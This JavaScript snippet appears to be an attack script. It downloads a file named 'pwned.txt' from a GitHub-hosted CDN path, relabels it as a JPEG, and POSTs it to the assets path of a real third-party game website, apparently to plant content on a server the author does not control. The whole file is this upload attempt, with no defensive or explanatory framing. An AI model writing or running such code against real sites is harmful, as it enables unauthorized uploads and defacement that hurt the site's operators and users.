const fileUrl = 'https://cdn.jsdelivr.net/gh/garsfaad0dnimym/wabshur_decreative/pwned.txt'; 

const serverUrl = 'https://beta.deeeep.io/assets/';

// Fetch the file from a different site
fetch(fileUrl)
  .then(response => {
    if (!response.ok) {
      throw new Error(`Failed to fetch file: ${response.statusText}`);
    }
    return response.blob();
  })
  .then(blob => {
    // Create a FormData object and append the file
    const formData = new FormData();
    formData.append('file', blob, 'remote-file.jpg'); // Change the file name if needed

    // Send the file to your server using Fetch API
    return fetch(serverUrl, {
      method: 'POST',
      body: formData
    });
  })
  .then(response => response.json())
  .then(data => {
    // Handle the server response if needed
    console.log('Server response:', data);
  })
  .catch(error => {
    console.error('Error:', error);
  });
